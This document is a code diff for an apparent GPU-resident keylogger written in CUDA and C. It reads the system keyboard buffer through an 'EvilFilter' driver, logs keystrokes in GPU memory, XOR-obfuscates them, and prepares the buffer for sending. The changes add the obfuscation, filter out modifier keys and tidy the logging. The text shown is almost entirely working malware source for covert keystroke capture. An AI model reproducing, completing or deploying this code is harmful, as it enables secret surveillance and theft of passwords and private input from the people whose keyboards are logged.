@@ -24,24 +24,53 @@
 
 #define DEBUG 1
 //#define BUFFER_SIZE 8192
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 128
 
 __global__ void copyKeyboardBuffer(PCHAR inBuffer, PCHAR outBuffer, PULONG keystrokeIndex) {
 	int index = blockIdx.x*blockDim.x + threadIdx.x;
 	// TODO: encrypt keystroke here? XOR 0x65?
-	outBuffer[index] = inBuffer[index];
+	if (index == 0) {
+		outBuffer[index] = inBuffer[index] ^ 0x65;
+	}
+	else {
+		outBuffer[index] = inBuffer[index] ^ inBuffer[index - 1] ^ index;
+	}
 	*keystrokeIndex = 0;
 }
 
-__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex) {
+__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex, PULONG previousState) {
 	int index = blockIdx.x*blockDim.x + threadIdx.x;
+
 	if (index == 0) {
+
 		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0
 
-			printf("GPUZ: %u %u %lu \n", *lastMake, *lastModifier, *keystrokeIndex);
 			if (*keystrokeIndex < BUFFER_SIZE) {
-				printf("Incrementing keystroke index");
-				cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
+				CHAR key = KeyMap[keyboardData->MakeCode];
+				if (key == INVALID) {
+
+				}
+				else if (key == ENTER) {
+
+				}
+				else if (key == LSHIFT) {
+
+				}
+				else if (key == RSHIFT) {
+
+				}
+				else if (key == CTRL) {
+
+				}
+				else if (key == ALT) {
+
+				}
+				else if (key == SPACE) {
+					cudaBuffer[(*keystrokeIndex)++] = ' ';
+				}
+				else {
+					cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
+				}
 			}
 			printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx] [%lu]\n",
 				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
@@ -147,16 +176,15 @@ int main(int argc, _TCHAR* argv[]) {
 				PUSHORT d_lastMake;
 				PUSHORT d_lastModifier;
 				PULONG d_keystrokeIndex;
+				PULONG d_keyboardState;
 				PULONG h_keystrokeIndex;
+				PULONG h_keyboardState;
 				PCHAR h_KeystrokeBuffer;
 				USHORT init0 = 666U;
 				ULONG init0long = 0LU;
+				ULONG init666long = 666LU;
 
-				printf(" init0 [%u] init0long [%lu]\n", init0, init0long);
-
-				printf("Ioctl to EvilFilter device succeeded \n");
-				printf("keyboardData=[0x%lx]\n", keyboardData);
-				printf(" we now have the real keyboard buffer!!!\n");
+				printf("Ioctl to EvilFilter device succeeded - we now have the real keyboard buffer.  KeyboardData=[0x%lx]\n", keyboardData);
 				//send address to GPU
 
 				checkCudaErrors(cudaSetDevice(0));
@@ -164,30 +192,25 @@ int main(int argc, _TCHAR* argv[]) {
 
 				h_keystrokeIndex = (PULONG)malloc(sizeof(ULONG));
 				*h_keystrokeIndex = 0;
+				h_keyboardState = (PULONG)malloc(sizeof(ULONG));
+				*h_keyboardState = 0;
 				h_KeystrokeBuffer = (PCHAR)malloc(sizeof(CHAR) * BUFFER_SIZE);
 
-				printf("Allocating lastMake...\n");
-				checkCudaErrors(cudaMalloc(&d_lastMake, sizeof(USHORT)));
-				printf("Allocating lastModifier...\n");
-				checkCudaErrors(cudaMalloc(&d_lastModifier, sizeof(USHORT)));
-				printf("Allocating keystrokeIndex...\n");
-				checkCudaErrors(cudaMalloc(&d_keystrokeIndex, sizeof(ULONG)));
-
-				printf("Allocating cudaBuffer...\n");
-				checkCudaErrors(cudaMalloc(&d_KeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE));
-				printf("Allocating cudaBuffer...\n");
+				printf("Allocating device variables...");
+				checkCudaErrors(cudaMalloc(&d_lastMake,                sizeof(USHORT)));
+				checkCudaErrors(cudaMalloc(&d_lastModifier,            sizeof(USHORT)));
+				checkCudaErrors(cudaMalloc(&d_keystrokeIndex,          sizeof(ULONG)));
+				checkCudaErrors(cudaMalloc(&d_keyboardState,           sizeof(ULONG)));
+				checkCudaErrors(cudaMalloc(&d_KeystrokeBuffer,         sizeof(CHAR) * BUFFER_SIZE));
 				checkCudaErrors(cudaMalloc(&d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE));
-				printf("Allocating cudaKeyMap...\n");
-				checkCudaErrors(cudaMalloc((void **)&d_KeyMap, sizeof(char) * 84));
-				
-				printf("Copying 0 to lastMake...");
-				checkCudaErrors(cudaMemcpy(d_lastMake, &init0, sizeof(USHORT), cudaMemcpyHostToDevice));	printf("coppied.\n");
-				printf("Copying 0 to lastModifier...");
-				checkCudaErrors(cudaMemcpy(d_lastModifier, &init0, sizeof(USHORT), cudaMemcpyHostToDevice));	printf("coppied.\n");
-				printf("Copying 0 to keystrokeIndex...");
-				checkCudaErrors(cudaMemcpy(d_keystrokeIndex, &init0long, sizeof(ULONG), cudaMemcpyHostToDevice));	printf("coppied.\n");
-				printf("Copying KeyMap to cudaKeyMap...");
-				checkCudaErrors(cudaMemcpy(d_KeyMap, KeyMap, 84 * sizeof(char), cudaMemcpyHostToDevice));	printf("coppied.\n");
+				checkCudaErrors(cudaMalloc((void **)&d_KeyMap,         sizeof(char) * 84));
+				printf("Allocated\nZeroing out device variables...");
+				checkCudaErrors(cudaMemcpy(d_lastMake,       &init0,       sizeof(USHORT),    cudaMemcpyHostToDevice));
+				checkCudaErrors(cudaMemcpy(d_lastModifier,   &init0,       sizeof(USHORT),    cudaMemcpyHostToDevice));
+				checkCudaErrors(cudaMemcpy(d_keystrokeIndex, &init0long,   sizeof(ULONG),     cudaMemcpyHostToDevice));
+				checkCudaErrors(cudaMemcpy(d_keyboardState,  &init666long, sizeof(ULONG),     cudaMemcpyHostToDevice));
+				checkCudaErrors(cudaMemcpy(d_KeyMap,         KeyMap,       84 * sizeof(char), cudaMemcpyHostToDevice));	
+				printf("Done.\n");
 
 				printf("Registering KeyboardData for use by CUDA...\n");
 				checkCudaErrors(cudaHostRegister(keyboardData, 10 * sizeof(char), cudaHostRegisterMapped));
@@ -198,13 +221,13 @@ int main(int argc, _TCHAR* argv[]) {
 				dim3 grid(1);
 				dim3 block(1); 
 				while (TRUE) { 
-					logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyMap, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_keystrokeIndex);
+					logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyMap, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_keystrokeIndex, d_keyboardState);
 					checkCudaErrors(cudaDeviceSynchronize());
 
 					checkCudaErrors(cudaMemcpy(h_keystrokeIndex, d_keystrokeIndex, sizeof(ULONG), cudaMemcpyDeviceToHost));
 					if (*h_keystrokeIndex >= BUFFER_SIZE) {
 						printf("copying buffer.\n");
-						copyKeyboardBuffer <<<2, 512 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
+						copyKeyboardBuffer <<<2, 64 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
 						checkCudaErrors(cudaDeviceSynchronize());
 						checkCudaErrors(cudaMemcpy(h_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE, cudaMemcpyDeviceToHost));
 						printf("sending buffer.\n"); 
